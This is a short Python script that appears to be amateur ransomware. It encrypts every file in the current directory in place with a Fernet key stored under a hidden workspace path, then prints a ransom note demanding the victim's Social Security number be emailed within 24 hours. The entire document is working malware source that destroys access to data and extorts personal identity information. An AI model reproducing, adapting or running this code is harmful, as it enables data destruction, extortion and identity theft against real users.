import os
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
  if file == "pyransom.py" or file == "/workspaces/pymal/pyransom/hiddenfiles/thekey.key":
    continue
  if os.path.isfile(file):
    files.append(file)

key = Fernet.generate_key()

with open("/workspaces/pymal/pyransom/hiddenfiles/thekey.key", "wb") as tk:
  tk.write(key)
for file in files:
  with open(file, "rb") as thef:
    contents = thef.read()
  contents_enc = Fernet(key).encrypt(contents)
  with open(file, "wb") as thef:
    thef.write(contents_enc)
print("your files have been encrypted.")
print("send your SSN to mrbananaiscool222@gmail.com")
print("you have 24 hours before you will never get anythin back :)")



  

  
